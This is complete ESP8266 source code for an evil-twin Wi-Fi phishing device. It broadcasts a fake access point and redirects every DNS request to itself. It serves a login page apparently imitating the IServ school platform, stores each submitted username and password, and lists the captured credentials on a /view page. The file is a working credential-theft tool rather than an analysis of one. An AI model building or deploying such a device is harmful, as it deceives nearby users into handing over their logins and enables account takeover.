#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include "config.h"

const byte DNS_PORT = 53;
IPAddress apIP(192,168,1,1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

String Argument_Name;
String usernames = "";
String passwords = "";
int reps = 1;

#include "html.h"

void setup(){
  Serial.begin(115200);
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(WiFiName);

  dnsServer.start(DNS_PORT, "*", apIP);

   webServer.onNotFound([]() {
    webServer.send(200, "text/html", IServHTML);
   });

    webServer.on("/error", errorPage);

    webServer.on("/view", showInputs);
    
    webServer.begin();
}

void errorPage(){
    webServer.send(200, "text/html", ErrorHTML);
    if (webServer.args() > 0 ) {
      for ( uint8_t i = 0; i < webServer.args(); i++ ) {
        Argument_Name = webServer.argName(i);
        if (webServer.argName(i) == "username") {
          usernames += "U" + String(reps) + ": " + webServer.arg(i) + " | ";
        }
        if(webServer.argName(i) == "password"){
          passwords += "P" + String(reps) + ": " + webServer.arg(i) + " | ";
        } 
        }
        reps += 1;
     }
    }


void showInputs(){
  String viewHTML=""
          "<!DOCTYPE html><html><head></head><body><p>" + usernames + "</p><br></br><p>" + passwords + "</p></body></html>";
  webServer.send(200, "text/html", viewHTML);
  }

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
}
